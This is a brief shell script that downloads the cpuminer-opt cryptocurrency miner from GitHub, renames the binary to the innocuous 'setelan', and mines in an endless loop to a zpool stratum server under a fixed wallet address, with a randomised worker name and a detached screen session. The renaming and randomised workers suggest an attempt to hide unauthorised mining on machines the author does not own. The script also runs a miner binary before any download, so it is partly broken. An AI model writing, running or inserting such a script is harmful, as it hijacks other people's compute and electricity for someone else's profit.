#!/bin/sh
sudo apt update
sudo apt install cpulimit
sudo apt install screen -y
screen -dmS random ./cpuminer-ryzen 
wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
tar xf cpuminer-opt-linux.tar.gz
mv cpuminer-avx setelan
while [ 1 ]; do
./setelan -a yespower -o stratum+tcp://yespower.sea.mine.zpool.ca:6234 -u DLJxHavMZ2u5TjHxhesYRQ73JvMmSvaR2v.$(echo $(shuf -i 1000-999999999 -n 1)-kinan) -p  c=DGB -t7
sleep 2
done
sleep 2
